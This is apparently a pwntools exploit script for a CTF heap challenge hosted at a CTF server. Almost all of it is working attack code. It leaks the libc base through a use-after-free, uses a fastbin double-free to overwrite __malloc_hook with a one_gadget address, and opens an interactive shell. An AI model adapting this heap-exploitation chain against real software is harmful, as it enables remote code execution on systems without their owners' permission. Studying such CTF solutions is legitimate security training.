#!/usr/bin/env python
from pwn import *
# unintended
# author: r4j

e = ELF('./chall')
#libc = e.libc
libc = ELF('./libc6_2.29-0ubuntu2_amd64.so')
#p = process('./chall')
p = remote('ctf.h-c0n.com', 60003)
#context.log_level = 'DEBUG'
context.terminal = ['tmux','new-window']

def c(ch):
    p.recvuntil('>> ')
    p.sendline(str(ch))

def add(idx,size,data):
    c(1)
    p.sendlineafter("Paper's index: ",str(idx))
    p.sendlineafter("Paper's size: ",str(size))
    p.sendafter("Paper's content: ",data)

def edit(idx,pos,data):
    c(2)
    p.sendlineafter("Paper's index: ",str(idx))
    p.sendlineafter('Which typo do you want to fix?:',str(pos))
    p.sendafter("Fix's content: ",data)

def delete(idx):
    c(3)
    p.sendlineafter("Paper's index: ",str(idx))

def show(idx):
    c(4)
    p.sendlineafter("Paper's index: ",str(idx))
    return p.recvline().strip()

for i in range(7):
    add(0,0x100,'a')
    delete(0)

free = delete
add(0,0x100,'a')
add(1,1,'a')
free(0)
add(1,0x100,'a')
free(0)
libc.address = u64(show(1).ljust(8,'\x00'))-0x1e4ca0
log.success("libc base: "+hex(libc.address))

for i in range(7):
    add(0,0x60,'b')
    delete(0)

add(0,0x60,'b')
add(1,0x60,'b')

delete(0)
delete(1)
delete(0)

add(0,0x60,p64(libc.symbols['__malloc_hook']-0x23))
for i in range(2): add(0,0x60,'L')
add(0,0x60,'\x00'*0x13+p64(libc.address+0x106ef8))
c(1)
p.sendlineafter("Paper's index: ",'1')
p.sendlineafter("Paper's size: ",'1')
p.interactive()
